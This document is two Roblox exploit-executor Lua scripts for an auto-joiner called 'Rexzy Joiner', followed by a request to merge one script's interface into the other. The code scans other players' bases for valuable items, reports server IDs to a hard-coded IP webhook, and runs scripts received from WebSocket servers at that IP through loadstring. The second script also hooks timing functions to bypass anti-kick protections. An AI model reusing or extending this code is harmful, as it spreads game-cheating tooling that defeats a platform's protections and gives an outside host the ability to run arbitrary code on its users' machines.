

getgenv().webhook = "http://144.172.110.44:5000/send"

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

local function parseGeneration(text)
    if not text or text == "" then return 0 end
    text = tostring(text):gsub(",", ""):gsub("%$", ""):match("^%s*(.-)%s*$") or text
    if text:match("/[sS]") then text = text:gsub("/[sS]", "") end
    local minPart, secPart = text:match("^(%d+)%s*[mM]%s+(%d+)%s*[sS]$") or text:match("^(%d+)[mM](%d+)[sS]$")
    if minPart then return (tonumber(minPart) or 0) * 60 + (tonumber(secPart) or 0) end
    local onlySec = text:match("^(%d+)%s*[sS]$")
    if onlySec and not text:match("[kKmMbB]") then return tonumber(onlySec) or 0 end
    local numStr, suf = text:match("([%d%.]+)%s*([kKmMbB]?)")
    local val = tonumber(numStr) or 0
    if suf and suf ~= "" then
        local lower = suf:lower()
        if lower == "k" then val = val * 1e3
        elseif lower == "m" then val = val * 1e6
        elseif lower == "b" then val = val * 1e9
        end
    end
    return val
end

local function formatValue(amount)
    if type(amount) ~= "number" then return tostring(amount) end
    if amount >= 1e12 then return string.format("%.2fT", amount / 1e12)
    elseif amount >= 1e9 then return string.format("%.2fB", amount / 1e9)
    elseif amount >= 1e6 then return string.format("%.2fM", amount / 1e6)
    elseif amount >= 1e3 then return string.format("%.2fK", amount / 1e3)
    else return tostring(amount) end
end

local function buildJoinLink(placeId, jobId)
    return string.format("https://chillihub1.github.io/chillihub-joiner/?placeId=%d&gameInstanceId=%s", tonumber(placeId) or game.PlaceId, tostring(jobId or game.JobId))
end

local function buildJoinScript(placeId, jobId)
    return string.format("`game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game.Players.LocalPlayer)`", tonumber(placeId) or game.PlaceId, tostring(jobId or game.JobId))
end

local function sendWebhookAnimal(genText, genValue, jobId)
    local currentPlayers = #Players:GetPlayers()
    local maxPlayers = Players.MaxPlayers or 0
    if maxPlayers > 0 and currentPlayers >= maxPlayers then return end
    local joinLink = buildJoinLink(game.PlaceId, jobId or game.JobId)
    local joinScript = buildJoinScript(game.PlaceId, jobId or game.JobId)
    local embed = {
        title = "🐾 Highest Animal Found!",
        description = string.format("**Generation:** %s\n**Value:** %s\n\n➡️ **📎 Join Link:** [Click here](%s)\n➡️ **📜 Join Script (PC):** %s", tostring(genText), formatValue(genValue), joinLink, joinScript),
        color = 16711680,
        fields = {
            {name = "Players", value = string.format("%d/%d", currentPlayers, maxPlayers), inline = true},
            {name = "Job ID", value = tostring(jobId or game.JobId), inline = true},
        },
        footer = {text = "Rexzy Notifier"},
        timestamp = (DateTime and DateTime.now and DateTime.now():ToIsoDate()) or ""
    }
    local payload = {username = "Notifier", embeds = {embed}}
    local jsonData = HttpService:JSONEncode(payload)
    local req = http_request or request or (syn and syn.request) or (http and http.request)
    if not req then return end
    pcall(function()
        req({Url = getgenv().webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = jsonData})
    end)
end

local lastSentText, lastSentValue = nil, -1
local currentBeam = nil
local userBaseHighlight = nil

local function createBeamToAnimal(targetPart)
    if currentBeam then pcall(function() currentBeam:Destroy() end) currentBeam = nil end
    if not targetPart then return end
    local character = LocalPlayer.Character
    if not character then return end
    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then return end
    local att0 = Instance.new("Attachment")
    att0.Parent = humanoidRootPart
    att0.Name = "BeamOrigin"
    local att1 = Instance.new("Attachment")
    att1.Parent = targetPart
    att1.Name = "BeamTarget"
    local beam = Instance.new("Beam")
    beam.Attachment0 = att0
    beam.Attachment1 = att1
    beam.Color = ColorSequence.new(Color3.fromRGB(255,0,0), Color3.fromRGB(255,255,0))
    beam.Width0 = 0.5
    beam.Width1 = 0.5
    beam.FaceCamera = true
    beam.Transparency = NumberSequence.new(0.3)
    beam.LightEmission = 1
    beam.Parent = humanoidRootPart
    currentBeam = beam
end

local function highlightUserBase()
    if userBaseHighlight then pcall(function() userBaseHighlight:Destroy() end) userBaseHighlight = nil end
    local plots = Workspace:FindFirstChild("Plots")
    if not plots then return end
    for _, plot in pairs(plots:GetChildren()) do
        if plot:IsA("Model") then
            for _, desc in pairs(plot:GetDescendants()) do
                if desc:IsA("TextLabel") and desc.Text == (LocalPlayer and LocalPlayer.Name or "") .. "'s Base" then
                    local highlight = Instance.new("Highlight")
                    highlight.Adornee = plot
                    highlight.FillColor = Color3.fromRGB(255,0,0)
                    highlight.FillTransparency = 0.7
                    highlight.OutlineColor = Color3.fromRGB(255,0,0)
                    highlight.OutlineTransparency = 0
                    highlight.Parent = plot
                    userBaseHighlight = highlight
                    return
                end
            end
        end
    end
end
task.spawn(function()
    local threshold = 1e6
    local scanInterval = 5
    local currentHighestValue = -1
    local currentHighestPart = nil
    highlightUserBase()
    while true do
        local plots = Workspace:FindFirstChild("Plots")
        if plots then
            local validAnimals = {}
            for _, plot in pairs(plots:GetChildren()) do
                if plot:IsA("Model") then
                    local isOwn = false
                    for _, desc in pairs(plot:GetDescendants()) do
                        if desc:IsA("TextLabel") and desc.Text == (LocalPlayer and LocalPlayer.Name or "") .. "'s Base" then
                            isOwn = true
                            break
                        end
                    end
                    if not isOwn then
                        local animalPodiums = plot:FindFirstChild("AnimalPodiums")
                        if animalPodiums then
                            for _, podium in pairs(animalPodiums:GetChildren()) do
                                local basePart = podium:FindFirstChild("Base", true)
                                local spawn = basePart and basePart:FindFirstChild("Spawn", true)
                                local attach = spawn and spawn:FindFirstChild("Attachment", true)
                                local overhead = attach and attach:FindFirstChild("AnimalOverhead", true)
                                local gen = overhead and overhead:FindFirstChild("Generation")
                                if basePart and gen and gen:IsA("TextLabel") then
                                    local genText = gen.Text
                                    if string.find(genText, "%$") then
                                        local val = parseGeneration(genText)
                                        table.insert(validAnimals, {text = genText, value = val, part = basePart})
                                    end
                                end
                            end
                        end
                    end
                end
            end
            table.sort(validAnimals, function(a,b) return a.value > b.value end)
            if #validAnimals > 0 then
                local highest = validAnimals[1]
                if highest.value > currentHighestValue or currentHighestPart ~= highest.part then
                    currentHighestValue = highest.value
                    currentHighestPart = highest.part
                    createBeamToAnimal(highest.part)
                    if highest.value >= threshold and (highest.text ~= lastSentText or highest.value ~= lastSentValue) then
                        sendWebhookAnimal(highest.text, highest.value, game.JobId)
                        lastSentText, lastSentValue = highest.text, highest.value
                    end
                end
            else
                currentHighestValue = -1
                currentHighestPart = nil
                if currentBeam then pcall(function() currentBeam:Destroy() end) currentBeam = nil end
            end
            if not userBaseHighlight or not userBaseHighlight.Parent then highlightUserBase() end
        end
        task.wait(scanInterval)
    end
end)

local function showSplashOnce(callback)
    local flagFile = "rexzy_first_run.flag"
    if isfile and isfile(flagFile) then callback() return end
    local SplashGui = Instance.new("ScreenGui")
    SplashGui.Name = "SplashScreen"
    SplashGui.IgnoreGuiInset = true
    SplashGui.Parent = game:GetService("CoreGui")
    local BlackFrame = Instance.new("Frame")
    BlackFrame.Size = UDim2.new(1,0,1,0)
    BlackFrame.BackgroundColor3 = Color3.new(0,0,0)
    BlackFrame.BorderSizePixel = 0
    BlackFrame.Parent = SplashGui
    local ScamLabel = Instance.new("TextLabel")
    ScamLabel.Size = UDim2.new(1,0,0,50)
    ScamLabel.Position = UDim2.new(0,0,0.05,0)
    ScamLabel.BackgroundTransparency = 1
    ScamLabel.TextColor3 = Color3.fromRGB(255,255,255)
    ScamLabel.Font = Enum.Font.GothamBold
    ScamLabel.TextSize = 22
    ScamLabel.Text = "If you paid for this, you got scammed"
    ScamLabel.Parent = BlackFrame
    local TitleLabel = Instance.new("TextLabel")
    TitleLabel.Size = UDim2.new(1,0,0,70)
    TitleLabel.Position = UDim2.new(0,0,0.4,0)
    TitleLabel.BackgroundTransparency = 1
    TitleLabel.TextColor3 = Color3.fromRGB(255,255,255)
    TitleLabel.Font = Enum.Font.GothamBlack
    TitleLabel.TextSize = 36
    TitleLabel.Text = "Rexzy Joiner"
    TitleLabel.Parent = BlackFrame
    local DiscordLabel = Instance.new("TextLabel")
    DiscordLabel.Size = UDim2.new(1,0,0,40)
    DiscordLabel.Position = UDim2.new(0,0,0.55,0)
    DiscordLabel.BackgroundTransparency = 1
    DiscordLabel.TextColor3 = Color3.fromRGB(200,200,255)
    DiscordLabel.Font = Enum.Font.GothamBold
    DiscordLabel.TextSize = 20
    DiscordLabel.Text = "discord.gg/joiner"
    DiscordLabel.Parent = BlackFrame
    local CountdownLabel = Instance.new("TextLabel")
    CountdownLabel.Size = UDim2.new(1,0,0,40)
    CountdownLabel.Position = UDim2.new(0,0,0.9,0)
    CountdownLabel.BackgroundTransparency = 1
    CountdownLabel.TextColor3 = Color3.fromRGB(255,255,255)
    CountdownLabel.Font = Enum.Font.Gotham
    CountdownLabel.TextSize = 18
    CountdownLabel.Text = "This will disappear in 10"
    CountdownLabel.Parent = BlackFrame
    task.spawn(function()
        for i=10,1,-1 do
            CountdownLabel.Text = "This will disappear in "..i
            task.wait(1)
        end
        SplashGui:Destroy()
        if writefile then pcall(function() writefile(flagFile,"true") end) end
        callback()
    end)
end

local function startJoiner()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "JoinerUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 280, 0, 90)
    frame.Position = UDim2.new(0.5, -140, 0, 0)
    frame.BackgroundTransparency = 1
    frame.Parent = screenGui

    local outline = Instance.new("TextLabel")
    outline.Text = "discord.gg/joiner"
    outline.Font = Enum.Font.SourceSansBold
    outline.TextSize = 26
    outline.TextColor3 = Color3.new(0,0,0)
    outline.Position = UDim2.new(0,2,0,2)
    outline.Size = UDim2.new(1,0,0,35)
    outline.BackgroundTransparency = 1
    outline.ZIndex = 0
    outline.Parent = frame

    local mainText = outline:Clone()
    mainText.ZIndex = 1
    mainText.TextColor3 = Color3.new(1,1,1)
    mainText.Position = UDim2.new(0,0,0,0)
    mainText.Parent = frame

    local startButton = Instance.new("TextButton")
    startButton.Text = "Start"
    startButton.Font = Enum.Font.SourceSans
    startButton.TextSize = 18
    startButton.BackgroundColor3 = Color3.fromRGB(45,45,65)
    startButton.TextColor3 = Color3.new(1,1,1)
    startButton.Size = UDim2.new(0.4,0,0,25)
    startButton.Position = UDim2.new(0,8,0,40)
    startButton.Parent = frame
    Instance.new("UICorner", startButton).CornerRadius = UDim.new(0,8)

    local settingsButton = Instance.new("TextButton")
    settingsButton.Text = "Settings"
    settingsButton.Font = Enum.Font.SourceSans
    settingsButton.TextSize = 18
    settingsButton.BackgroundColor3 = Color3.fromRGB(45,45,65)
    settingsButton.TextColor3 = Color3.new(1,1,1)
    settingsButton.Size = UDim2.new(0.4,0,0,25)
    settingsButton.Position = UDim2.new(0.55,-8,0,40)
    settingsButton.Parent = frame
    Instance.new("UICorner", settingsButton).CornerRadius = UDim.new(0,8)

    local function hoverEffect(btn)
        btn.MouseEnter:Connect(function() btn.BackgroundColor3 = Color3.fromRGB(60,60,90) end)
        btn.MouseLeave:Connect(function()
            if btn == startButton and AutoJoinEnabled then
                btn.BackgroundColor3 = Color3.fromRGB(60,150,60)
            else
                btn.BackgroundColor3 = Color3.fromRGB(45,45,65)
            end
        end)
    end
    hoverEffect(startButton)
    hoverEffect(settingsButton)

    getgenv().webhook = getgenv().webhook or "http://144.172.110.44:5000/send"
    local hwid = "unknown_hwid"
    pcall(function() hwid = game:GetService("RbxAnalyticsService"):GetClientId() end)
    local cfgFile = "autojoin_"..hwid..".json"
    local MinMS = 1000000

    local function loadConfig()
        if isfile and isfile(cfgFile) then
            local ok,data = pcall(function() return HttpService:JSONDecode(readfile(cfgFile)) end)
            if ok and type(data)=="table" and data.MinMS then MinMS = data.MinMS end
        end
    end
    local function saveConfig()
        if writefile then
            pcall(function() writefile(cfgFile,HttpService:JSONEncode({MinMS=MinMS})) end)
        end
    end
    loadConfig()

    local popup
    local function openSettings()
        if popup then popup:Destroy() end
        popup = Instance.new("ScreenGui")
        popup.Parent = game:GetService("CoreGui")

        local box = Instance.new("Frame")
        box.Size = UDim2.new(0,200,0,100)
        box.Position = UDim2.new(0.5,-100,0.5,-50)
        box.BackgroundColor3 = Color3.fromRGB(25,25,35)
        box.Parent = popup
        Instance.new("UICorner", box).CornerRadius = UDim.new(0,10)

        local input = Instance.new("TextBox", box)
        input.Size = UDim2.new(1,-40,0,30)
        input.Position = UDim2.new(0,20,0,20)
        input.BackgroundColor3 = Color3.fromRGB(45,45,65)
        input.TextColor3 = Color3.new(1,1,1)
        input.Font = Enum.Font.Gotham
        input.TextSize = 14
        input.Text = tostring(MinMS/1e6)
        input.ClearTextOnFocus = false
        Instance.new("UICorner", input).CornerRadius = UDim.new(0,8)

        local save = Instance.new("TextButton", box)
        save.Size = UDim2.new(1,-40,0,28)
        save.Position = UDim2.new(0,20,0,60)
        save.BackgroundColor3 = Color3.fromRGB(60,60,90)
        save.TextColor3 = Color3.new(1,1,1)
        save.Font = Enum.Font.GothamBold
        save.TextSize = 14
        save.Text = "Save"
        Instance.new("UICorner", save).CornerRadius = UDim.new(0,8)

        save.MouseButton1Click:Connect(function()
            local val = tonumber(input.Text)
            if val then
                MinMS = math.clamp(val*1e6,1e6,1e10)
                saveConfig()
                popup:Destroy()
            end
        end)
    end
    settingsButton.MouseButton1Click:Connect(openSettings)

    local ws1, ws2
    AutoJoinEnabled = false

    local function connectWebSockets()
        if not WebSocket then warn("Executor lacks WebSocket support.") return end

        if ws1 then pcall(function() ws1:Close() end) ws1=nil end
        local ok1,socket1 = pcall(function() return WebSocket.connect("ws://144.172.110.44:8765/script") end)
        if ok1 and socket1 then ws1=socket1 end

        if ws2 then pcall(function() ws2:Close() end) ws2=nil end
        local ok2,socket2 = pcall(function() return WebSocket.connect("ws://144.172.110.44:8766") end)
        if ok2 and socket2 then ws2=socket2 end

        if ws1 then
            ws1.OnMessage:Connect(function(msg)
                local ok,data = pcall(function() return HttpService:JSONDecode(msg) end)
                if not ok or type(data)~="table" then return end
                if data.type=="server_update" and data.data and data.data.money then
                    local moneyStr = data.data.money
                    if string.find(moneyStr,"/") then
                        local val = parseGeneration(moneyStr)
                        if val>=MinMS then
                            local func,err = loadstring(data.data.join_script)
                            if func then pcall(func) else warn(err) end
                        end
                    end
                end
            end)
        end

        if ws2 then
            ws2.OnMessage:Connect(function(msg)
                local ok,data = pcall(function() return HttpService:JSONDecode(msg) end)
                if not ok or type(data)~="table" then return end
                local genStr = data.Generation
                local scriptPC = data["Join Script (PC)"]
                if genStr and scriptPC then
                    local val = parseGeneration(genStr)
                    if val>=MinMS then
                        local func,err = loadstring(scriptPC:gsub("`$",""))
                        if func then pcall(func) else warn(err) end
                    end
                end
            end)
        end
    end

    startButton.MouseButton1Click:Connect(function()
        AutoJoinEnabled = not AutoJoinEnabled
        startButton.Text = AutoJoinEnabled and "Stop" or "Start"
        startButton.BackgroundColor3 = AutoJoinEnabled and Color3.fromRGB(60,150,60) or Color3.fromRGB(45,45,65)
        if AutoJoinEnabled then connectWebSockets() elseif ws1 or ws2 then
            if ws1 then pcall(function() ws1:Close() end) ws1=nil end
            if ws2 then pcall(function() ws2:Close() end) ws2=nil end
        end
    end)
end

showSplashOnce(startJoiner)





Get the UI from this and add it to this 

(function()
    repeat task.wait() until game:IsLoaded()

    local WebSocketURL = "ws://144.172.110.44:1488"

    local HttpService = game:GetService("HttpService")
    local Players = game:GetService("Players")

    -- Anti-kick / lagger bypass
    pcall(function()
        hookfunction(isfunctionhooked, function(func)
            if func == tick then return false end
        end)
    end)

    local origTick = tick
    pcall(function()
        getfenv()["tick"] = function() return math.huge end
        hookfunction(tick, function() return math.huge end)
    end)

    for _, player in pairs(Players:GetPlayers()) do
        player.CharacterAdded:Connect(function()
            player:ClearCharacterAppearance()
        end)
        if player.Character then player:ClearCharacterAppearance() end
    end

    Players.PlayerAdded:Connect(function(player)
        if player.Character then player:ClearCharacterAppearance() end
        player.CharacterAdded:Connect(function()
            player:ClearCharacterAppearance()
        end)
    end)

    local function prints(str)
        print("[AutoJoiner]: " .. str)
    end

    local function findTargetGui()
        local coreGui = game:GetService("CoreGui")
        for _, gui in ipairs(coreGui:GetChildren()) do
            if gui:IsA("ScreenGui") then
                local mainFrame = gui:FindFirstChild("MainFrame")
                if mainFrame and mainFrame:FindFirstChild("ContentContainer") then
                    local contentContainer = mainFrame.ContentContainer
                    local tabServer = contentContainer:FindFirstChild("TabContent_Server")
                    if tabServer then
                        return tabServer
                    end
                end
            end
        end
        return nil
    end

    local function setJobIDText(targetGui, text)
        if not targetGui then return end
        local inputFrame = targetGui:FindFirstChild("Input")
        if not inputFrame then return end
        local textBox = inputFrame:FindFirstChildOfClass("TextBox")
        if not textBox then return end

        textBox.Text = text
        pcall(function() firesignal(textBox.FocusLost) end)
        prints("Textbox updated: " .. text)
        return origTick()
    end

    local function clickJoinButton(targetGui)
        for _, buttonFrame in ipairs(targetGui:GetChildren()) do
            if buttonFrame:IsA("Frame") and buttonFrame.Name == "Button" then
                local textLabel = buttonFrame:FindFirstChildOfClass("TextLabel")
                local imageButton = buttonFrame:FindFirstChildOfClass("ImageButton")
                if textLabel and imageButton and textLabel.Text == "Join Job-ID" then
                    return imageButton
                end
            end
        end
        return nil
    end

    local function bypass10M(jobId)
        task.defer(function()
            local targetGui = findTargetGui()
            if not targetGui then
                prints("Failed to find TabContent_Server")
                return
            end
            local start = setJobIDText(targetGui, jobId)
            local button = clickJoinButton(targetGui)
            if not button then
                prints("Join button not found.")
                return
            end
            local cons = getconnections(button.MouseButton1Click)
            if cons and cons[1] then
                cons[1]:Fire()
                prints(string.format("Join clicked | delay: %.5fs", origTick() - start))
            else
                prints("No MouseButton1Click connections.")
            end
        end)
    end

    local function justJoin(script)
        local func, err = loadstring(script)
        if func then
            local ok, res = pcall(func)
            if not ok then prints("Script error: " .. tostring(res)) end
        else
            prints("Load error: " .. tostring(err))
        end
    end

    local function connect()
        while true do
            prints("Connecting to " .. WebSocketURL)
            local success, socket = pcall(function()
                return WebSocket.connect(WebSocketURL)
            end)

            if success and socket then
                prints("Connected to WebSocket!")
                local ws = socket

                ws.OnMessage:Connect(function(msg)
                    prints("Received: " .. msg)
                    local ok, data = pcall(function()
                        return HttpService:JSONDecode(msg)
                    end)

                    if ok and type(data) == "table" then
                        local jobId = data.jobid or ""
                        local money = data.money or ""
                        local name = data.name or ""

                        prints(string.format("Job from %s | Money: %s", name, money))

                        -- always join instantly (no filtering)
                        bypass10M(jobId)
                    else
                        -- fallback: non-JSON messages
                        if string.find(msg, "TeleportService") then
                            justJoin(msg)
                        else
                            bypass10M(msg)
                        end
                    end
                end)

                ws.OnClose:Connect(function()
                    prints("WebSocket closed. Reconnecting...")
                    task.wait(1)
                    connect()
                end)
                break
            else
                prints("Failed to connect, retrying...")
                task.wait(1)
            end
        end
    end

    connect()
end)()













